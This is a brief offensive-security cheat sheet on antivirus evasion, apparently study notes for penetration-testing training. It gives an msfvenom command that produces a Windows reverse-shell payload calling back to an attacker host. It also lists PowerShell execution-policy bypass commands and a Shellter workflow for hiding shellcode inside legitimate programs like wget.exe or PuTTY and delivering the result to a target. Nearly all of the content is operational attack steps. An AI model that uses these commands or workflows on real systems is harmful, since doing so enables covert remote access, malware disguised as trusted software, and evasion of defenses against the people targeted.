# AV Evasion

## In-Memory Injection with PowerShell

Allocates unmanaged memory, decodes a base64 shellcode payload, and executes it in-process (within `powershell.exe` itself).

**Generate shellcode:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<host> LPORT=443 -f psh-reflection
```

**PowerShell execution policies:**
```powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
# Per-execution bypass
powershell -ExecutionPolicy Bypass -File script.ps1
```

---

## Shellter (AV Bypass via PE Injection)

Injects shellcode into a legitimate Windows PE binary (e.g., `wget.exe`, `putty.exe`).

**Lab workflow:**
1. Use a legitimate PE binary (`wget.exe`, PuTTY, etc.) as the carrier
2. Run Shellter on a Windows VM to inject payload
3. Transfer via FTP (use binary mode: `binary` command in FTP session)
4. Upload to target
